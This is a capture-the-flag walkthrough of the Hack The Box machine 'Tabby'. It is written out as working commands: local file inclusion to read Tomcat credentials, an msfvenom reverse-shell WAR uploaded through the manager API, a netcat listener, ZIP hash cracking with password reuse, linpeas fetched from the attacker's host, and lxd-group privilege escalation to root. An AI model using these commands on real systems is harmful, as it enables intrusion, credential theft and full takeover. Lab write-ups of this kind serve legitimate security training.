# Tabby - Easy

```sh
sudo vim /etc/hosts
# add tabby.htb

nmap -T4 -p- -A -Pn -v tabby.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4
    * 80/tcp - http - Apache httpd 2.4.41
    * 8080/tcp - http - Apache Tomcat

* the webpage on port 80 is for a hosting solution and offers several services

* checking the content on the website as well as the source code, we find a few clues:

    * email 'sales@megahosting.htb' is mentioned - so we can update our ```/etc/hosts``` entry with this new domain

    * 'http://megahosting.htb' leads to the same page, so we can check this later for any other subdomains

    * a link to 'http://megahosting.htb/news.php?file=statement' contains a notice about a previous data breach, which mentions that the website has removed the tool causing the breach

    * visiting 'http://megahosting.htb/news.php' gives a blank page, so it is possible that we can fuzz the 'file' parameter for any other values

* checking the webpage on port 8080 shows the bare default Tomcat homepage; it discloses its path as ```/var/lib/tomcat9/webapps/ROOT/index.html``` and user configuration file at ```/etc/tomcat9/tomcat-users.xml```

* the page also provides outgoing links to '/docs', '/manager/html' (manager webapp) & '/host-manager/html' (host-manager webapp)

* navigating to '/docs' discloses version as Apache Tomcat 9.0.31; and the manager & host-manager webapp pages prompt a basic authentication pop-up form

* Googling for exploits associated with this release does not give anything

* we can try using default and weak creds using the 'tomcat_mgr_login' module in ```metasploit```:

    ```sh
    msfconsole -q

    search tomcat login

    use auxiliary/scanner/http/tomcat_mgr_login

    options
    
    set RHOSTS tabby.htb

    run
    # weak creds not configured
    ```

* this does not work, so we can continue web enumeration to find any secrets:

    ```sh
    gobuster dir -u http://megahosting.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx,js,json,docx,pdf,cgi,sql,xml,tar,gz,db -t 25
    # dir scan of main webpage

    ffuf -c -u 'http://megahosting.htb' -H 'Host: FUZZ.megahosting.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 14175 -s
    # subdomain scan

    ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u 'http://megahosting.htb/news.php?file=FUZZ' -fs 0 -s
    # parameter fuzzing
    # this gives a few hits
    ```

* ```gobuster``` finds new pages - '/files' and '/Readme.txt'

* '/Readme.txt' does not contain any useful info, and '/files' is 403 Forbidden

* using ```ffuf``` to check for any injection in the 'file' parameter works as we can see hits for values like ```/../../../../../../../../../../etc/passwd```

* we can test this further to check if the page really allows LFI:

    ```sh
    curl 'http://megahosting.htb/news.php?file=/etc/passwd'
    # this does not work

    # but if we include '../' to navigate out of the current web folder, it works
    curl 'http://megahosting.htb/news.php?file=../../../../etc/passwd'
    ```

* ```/etc/passwd``` shows that a user 'ash' exists on the box, with user ID info 'clive' - we can check this later

* as we have LFI, we can [read other files related to the Tomcat config](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html):

    ```sh
    curl 'http://megahosting.htb/news.php?file=../../../../etc/tomcat9/tomcat-users.xml'
    # this does not work

    # check for config files within installation path at CATALINA_HOME and CATALINA_BASE

    curl 'http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml'
    # this works
    ```

* from the config file at ```/usr/share/tomcat9/etc/tomcat-users.xml```, we get the creds 'tomcat:$3cureP4s5w0rd123!' and the user is having the roles of 'admin-gui' & 'manager-script'

* we can attempt to access the Tomcat webapps now - login to '/manager/html' fails with an access denied error as we do not have the role of 'manager-gui'; but we can access the '/host-manager/html' page

* while we cannot access the GUI of the manager webapp, we still have the rights for 'manager-script', so we can interact with the manager app via CLI - we can abuse this to [upload & deploy a malicious WAR file](https://exploit-notes.hdks.org/exploit/web/apache-tomcat/#uploading-war-file-reverse-shell):

    ```sh
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f war -o shell.war
    # generate malicious WAR file

    curl --upload-file shell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://tabby.htb:8080/manager/text/deploy?path=/shell"
    # upload WAR file
    # this deploys app at '/shell' path

    nc -nvlp 4444
    # start listener
    ```

* now, if we access the webshell at 'http://tabby.htb:8080/shell', we get the reverse shell connection:

    ```sh
    # in reverse shell

    id
    # tomcat

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to bg shell
    stty raw -echo; fg
    # press Enter twice

    ls -la /var/www
    # enumerate megahosting webapp files

    ls -la /var/www/html

    cat /var/www/html/news.php
    # this fetches the files from 'files' folder in an insecure way

    ls -la /var/www/html/files
    ```

* the 'files' folder in the webapp directory includes a ZIP file owned by user 'ash', the 'statement' file seen earlier, and a couple of folders - we can transfer the ZIP file to our machine for checking, and review the other folders:

    ```sh
    ls -la /var/www/html/files/archive
    # empty

    ls -la /var/www/html/files/revoked_certs/
    # empty

    # transfer the ZIP file to attacker

    md5sum /var/www/html/files/16162020_backup.zip
    # check MD5 hash

    cat /var/www/html/files/16162020_backup.zip | base64 -w 0; echo
    # convert to base64 data
    ```

    ```sh
    # on attacker

    echo -n "<base64-encoded-content>" | base64 -d > backup.zip

    md5sum backup.zip
    ```

* we can try to check the ZIP file contents, but it needs a password - using ```zip2john``` we can crack it:

    ```sh
    zip2john backup.zip > backup_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash
    # this cracks the hash
    ```

* ```john``` gives the plaintext 'admin@it' - we can use this to extract all files from the ZIP file:

    ```sh
    unzip backup.zip

    # check all files

    cd var/www/html

    ls -la
    # the zip file is a backup of the web dir

    cat index.php
    # the files do not have any interesting info
    ```

* the backup ZIP file does not have any interesting info, but we can check for password re-use for 'ash' via SSH:

    ```sh
    ssh ash@tabby.htb
    # this does not work

    # we can attempt to 'su' via reverse shell
    su ash
    # this works with the same password

    cd
    
    ls -la

    cat user.txt
    # user flag

    sudo -l
    # not working
    ```

* we can attempt enum via ```linpeas``` - fetch script from attacker:

    ```sh
    wget http://10.10.14.27:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-31-generic, Ubuntu 20.04
    * ```id``` shows user is part of ```lxd``` group

* we can attempt to abuse [lxd group for privesc](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/lxc-lxd/):

    ```sh
    lxc image list
    # check if images are available on box
    # this does not work as 'lxc' binary is not in PATH
    # however, it mentions the command is available in '/snap/bin/lxc'

    /snap/bin/lxc image list
    # no images available
    # we need to build one image and transfer it
    ```

    ```sh
    # on attacker
    git clone https://github.com/saghul/lxd-alpine-builder.git
    
    cd lxd-alpine-builder

    sudo ./build-alpine

    ls -la
    # .tar.gz image file generated, note the filename

    python3 -m http.server
    ```

    ```sh
    # in reverse shell

    wget http://10.10.14.27:8000/alpine-v3.23-x86_64-20260112_0505.tar.gz
    # fetch image

    /snap/bin/lxc image import ./alpine-v3.23-x86_64-20260112_0505.tar.gz --alias testimage

    /snap/bin/lxc image list
    # verify image is imported

    /snap/bin/lxc init testimage testcontainer -c security.privileged=true
    # create new container from image
    # we get error - "Error: No storage pool found. Please create a new storage pool"

    lxd init
    # initialize lxd first, set default values in prompt
    # use correct path

    /snap/bin/lxd init

    /snap/bin/lxc config device add testcontainer testdevice disk source=/ path=/mnt/root recursive=true
    # mount new container to root directory

    /snap/bin/lxc start testcontainer
    # start test container

    /snap/bin/lxc exec testcontainer /bin/sh
    # get shell in mounted container

    # we get root shell
    id
    # root

    ls -la /mnt/root
    # root directory

    cat /mnt/root/root/root.txt
    # root flag
    ```
